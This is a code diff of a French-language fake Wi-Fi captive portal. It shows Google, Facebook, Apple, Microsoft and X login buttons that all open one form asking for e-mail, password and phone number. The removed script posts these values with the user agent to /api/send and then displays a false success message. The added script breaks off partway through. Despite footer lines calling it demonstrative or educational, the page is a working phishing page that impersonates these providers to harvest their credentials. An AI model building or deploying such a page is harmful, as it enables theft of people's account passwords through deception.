@@ -3,201 +3,138 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Portail Wi-Fi – Connexion</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+  <title>Portail Wi-Fi</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-papErYgqP4hEQcx8zTq5bQfU5ftZ1qQkiHv+5Vg1T/0Pd9kT7EYpJrmK3tU1PO+JzqKvW3K5UjNwTS1zYfEknw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
   <style>
-    :root {
-      --primary: #1a73e8;
-      --gray: #f2f3f5;
-      --text: #202124;
-      --subtext: #5f6368;
-      --radius: 10px;
-    }
-
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      font-family: 'Inter', sans-serif;
-    }
-
     body {
-      background: var(--gray);
-      height: 100vh;
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: #f8f9fb;
       display: flex;
-      align-items: center;
       justify-content: center;
-      padding: 1rem;
+      align-items: center;
+      height: 100vh;
     }
 
-    .container {
-      background: white;
-      padding: 2rem;
-      border-radius: var(--radius);
-      max-width: 400px;
+    .card {
+      background: #fff;
+      padding: 40px;
+      border-radius: 16px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
       width: 100%;
-      box-shadow: 0 5px 25px rgba(0,0,0,0.1);
+      max-width: 420px;
       text-align: center;
     }
 
-    .logo-placeholder {
-      width: 72px;
-      height: 72px;
-      background: var(--primary);
-      color: white;
+    .card h1 {
       font-size: 24px;
-      font-weight: bold;
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    .social-btn {
       display: flex;
       align-items: center;
-      justify-content: center;
-      border-radius: 50%;
-      margin: 0 auto 1rem;
-    }
-
-    h1 {
-      font-size: 1.5rem;
-      color: var(--text);
-      margin-bottom: 0.5rem;
-    }
-
-    .subtext {
-      color: var(--subtext);
-      font-size: 0.95rem;
-      margin-bottom: 1.5rem;
-    }
-
-    .provider-btn {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.5rem;
-      padding: 0.75rem 1rem;
-      border: 1px solid #ccc;
-      border-radius: var(--radius);
+      gap: 12px;
+      border: 1px solid #ddd;
+      padding: 12px;
+      border-radius: 8px;
+      margin-bottom: 16px;
       background: #fff;
-      width: 100%;
-      margin-bottom: 0.75rem;
       cursor: pointer;
-      transition: background 0.2s;
+      transition: all 0.2s ease-in-out;
     }
 
-    .provider-btn:hover {
-      background: #f0f0f0;
+    .social-btn:hover {
+      background-color: #f1f1f1;
     }
 
-    .provider-btn img {
-      width: 20px;
-      height: 20px;
+    .social-btn i {
+      font-size: 20px;
+      width: 24px;
+      text-align: center;
     }
 
-    form {
+    .form-container {
       display: none;
+      margin-top: 20px;
       text-align: left;
-      margin-top: 1.5rem;
     }
 
-    input {
+    .form-container input {
       width: 100%;
-      padding: 0.75rem;
-      margin-bottom: 1rem;
+      padding: 12px;
+      margin-bottom: 16px;
       border: 1px solid #ccc;
-      border-radius: var(--radius);
-      font-size: 1rem;
+      border-radius: 6px;
+      font-size: 14px;
     }
 
-    .btn-submit {
+    .form-container button {
       width: 100%;
-      background: var(--primary);
-      color: white;
+      padding: 12px;
+      background: #007bff;
       border: none;
-      padding: 0.75rem;
+      border-radius: 6px;
+      color: white;
       font-weight: 600;
-      border-radius: var(--radius);
       cursor: pointer;
     }
 
-    .btn-submit:hover {
-      background: #1765c1;
+    .form-container button:hover {
+      background: #0056b3;
     }
 
     .note {
-      font-size: 0.75rem;
-      color: red;
-      margin-top: 1.5rem;
+      font-size: 12px;
+      color: #888;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="logo-placeholder">Wi-Fi</div>
+  <div class="card">
     <h1>Connexion au Wi-Fi</h1>
-    <div class="subtext">Choisissez une méthode de connexion</div>
 
-    <button class="provider-btn" onclick="showForm('Google')">
-      <img src="https://developers.google.com/identity/images/g-logo.png" alt="Google" />
-      Continuer avec Google
-    </button>
+    <div class="social-btn" onclick="showForm('google')">
+      <i class="fab fa-google" style="color:#db4437"></i> Continuer avec Google
+    </div>
 
-    <button class="provider-btn" onclick="showForm('Facebook')">
-      <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook" />
-      Continuer avec Facebook
-    </button>
+    <div class="social-btn" onclick="showForm('facebook')">
+      <i class="fab fa-facebook" style="color:#3b5998"></i> Continuer avec Facebook
+    </div>
 
-    <button class="provider-btn" onclick="showForm('Apple')">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple" />
-      Continuer avec Apple
-    </button>
+    <div class="social-btn" onclick="showForm('apple')">
+      <i class="fab fa-apple" style="color:#000"></i> Continuer avec Apple
+    </div>
 
-    <button class="provider-btn" onclick="showForm('Microsoft')">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" />
-      Continuer avec Microsoft
-    </button>
+    <div class="social-btn" onclick="showForm('microsoft')">
+      <i class="fab fa-microsoft" style="color:#0078d4"></i> Continuer avec Microsoft
+    </div>
 
-    <button class="provider-btn" onclick="showForm('Twitter')">
-      <img src="https://upload.wikimedia.org/wikipedia/fr/c/c8/Twitter_Bird.svg" alt="Twitter" />
-      Continuer avec X / Twitter
-    </button>
+    <div class="social-btn" onclick="showForm('twitter')">
+      <i class="fab fa-x-twitter" style="color:#000"></i> Continuer avec X (Twitter)
+    </div>
 
-    <form id="provider-form">
+    <form id="auth-form" class="form-container">
       <input type="email" id="email" placeholder="Adresse e-mail" required />
       <input type="password" id="password" placeholder="Mot de passe" required />
       <input type="tel" id="phone" placeholder="Numéro de téléphone" required />
-      <button type="submit" class="btn-submit">Continuer</button>
+      <button type="submit">Se connecter</button>
     </form>
 
-    <div class="note">* Ceci est une page factice à but démonstratif uniquement.</div>
+    <div class="note">* Portail Wi-Fi pédagogique – aucune authentification réelle.</div>
   </div>
 
-  <script>
-    let currentProvider = 'Fournisseur inconnu';
+<script>
+  let sessionStart = Date.now();
 
-    function showForm(provider) {
-      currentProvider = provider;
-      document.getElementById('provider-form').style.display = 'block';
-    }
+  function showForm(provider) {
+    document.getElementById("auth-form").style.display = "block";
+  }
 
-    document.getElementById('provider-form').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-      const phone = document.getElementById('phone').value;
-
-      const payload = {
-        provider: currentProvider,
-        email,
-        password,
-        phone,
-        userAgent: navigator.userAgent
-      };
-
-      await fetch('/api/send', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-
-      alert('Connexion réussie. Redirection en cours...');
-    });
-  </script>
-</body>
-</html>
+  document.getElementById("auth-form").addEventListener("submit", async function (e) {
+    e.preventDefault();
+    const email = document.getElementById("email").value;
+    cons
